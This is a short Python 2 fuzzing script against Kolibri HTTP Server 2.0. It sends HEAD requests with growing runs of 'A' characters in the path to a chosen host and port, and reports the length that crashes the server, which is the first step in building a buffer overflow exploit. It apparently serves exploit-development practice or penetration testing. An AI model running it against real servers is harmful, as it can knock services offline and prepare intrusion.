#!/usr/bin/env python
import sys
import time
import socket

if len(sys.argv) < 3:
	print '[*] Kolibri HTTP Server 2.0 Fuzzer'
	print "[*] Usage: %s <ip addr> <port>" % sys.argv[0]
	sys.exit(1)
else:
	rhost = sys.argv[1]
	rport = int(sys.argv[2])


buffer=["A"]
counter=100
while len(buffer) <= 30:
  buffer.append("A"*counter)
  counter=counter+200

try:
	for string in buffer:
		print '[*] Fuzzing HTTP Server on port {} with: {} bytes'.format(rport, len(string))

		payload = ""
		payload += "HEAD /"+string+" HTTP/1.1\r\n"
		payload += "Host: "+rhost+":"+str(rport)+"\r\n"
		payload += "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
		payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
		payload += "Accept-Language: en-US,en;q=0.5\r\n"
		payload += "Accept-Encoding: gzip, deflate\r\n"
		payload += "Connection: close\r\n\r\n"

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect = s.connect((rhost, rport))

		s.send(payload)
		s.close()
		time.sleep(0.5)

except socket.error:
	print "[-] Crash with %d bytes" % len(string)